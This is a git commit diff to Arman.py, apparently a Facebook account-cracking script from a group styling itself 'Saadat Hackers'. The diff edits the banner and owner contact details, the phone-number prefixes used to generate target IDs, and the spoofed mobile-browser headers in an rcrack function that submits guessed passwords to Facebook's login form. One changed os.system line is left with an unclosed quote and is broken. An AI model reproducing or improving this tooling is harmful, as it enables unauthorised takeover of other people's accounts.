a9eb33a34dcba2d4427c8d3f53864c20c2fe1a15
Alyasskhan <133959200+Alyasskhan@users.noreply.github.com>
2023-05-24 08:16:23 +0430

    Update Arman.py

--- Arman.py
+++ Arman.py
@@ -61,7 +61,7 @@ def o():
         ('https://www.facebook.com/profile.php?id=100028315179402')
         return None
     if None == '3':
-        os.system('https://www.facebook.com/profile.php?id=100028315179402')
+        os.system('https://www.facebook.com/profile.php?id=100028315179402)
         return None
     if None == '4':
         os.system('https://www.facebook.com/profile.php?id=100028315179402')
@@ -173,16 +173,15 @@ logo =                                          f"""{H}
       \033[1;39m .##...##.........##.##.....##
       \033[1;32m .##....##..##....##.##.....##
       \033[1;39m .##.....##..######..##.....##
-                                                                                                                                     
 \033[1;37m WELL COME 
-\033[1;31m\033[1;32m \033[1;32mOWNER\033[1;31m \033[1;32mRaziqullah Saadat \033[1;31m
-\033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32mRaziqullah Saadat\033[1;31m 
-\033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32mARMAN\033[1;31m 
-\033[1;31m\033[1;32m\033[1;32mWHATSAPP \033[1;31m\033[1;32m+93702856593 \033[1;31m 
-\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m0.1\033[1;31m 
-\033[1;37mWHTASAPP GROUP SAADAT HACKERS{ M }\033[1;37m 
+\033[1;31m\033[1;32m \033[1;32mOWNER\033[1;31m \033[1;32m     Raziqullah Saadat \033[1;31m
+\033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32m Raziqullah Saadat \033[1;31m 
+\033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32m   ARMAN\033[1;31m 
+\033[1;31m\033[1;32m\033[1;32mWHATSAPP \033[1;31m\033[1;32m +93702856593 \033[1;31m 
+\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 10.00\033[1;31m 
+\033[1;37mMESSENGER GROUP Saadat HACKERS{ R-S }\033[1;37m 
 \033[1;92m==========================================================
-\033[33;44m NAME YAD SATYE Raziqullah Saadat \033[0;m
+\033[33;44m NAME YAD SATYE Raziqullah Saadat  \033[0;m
 \033[1;92m=========================================================="""      
 loop = 0
 oks = []
@@ -248,10 +247,10 @@ def i():
     jalan(logo)
     
     
-    jalan("\033[1;37m\t  USE ALL COUNTRY CODE  ")
+    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
     jalan('\033[1;36m     \t     AFG CODES\n     \033[1;33m9370, \033[1;33m9377 ,\033[1;33m9378 ,\033[1;33m9370  ...\033[0;97m')
     jalan('\033[1;32m============================================')
-    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
+    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m9379 ,\033[1;33m9377 ,\033[1;33m9371  ...\033[0;97m')
     jalan('\033[1;32m============================================')
     jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
     jalan('\033[1;32m============================================\n')
@@ -309,16 +308,16 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'x.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'referer': 'https://x.facebook.com/',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
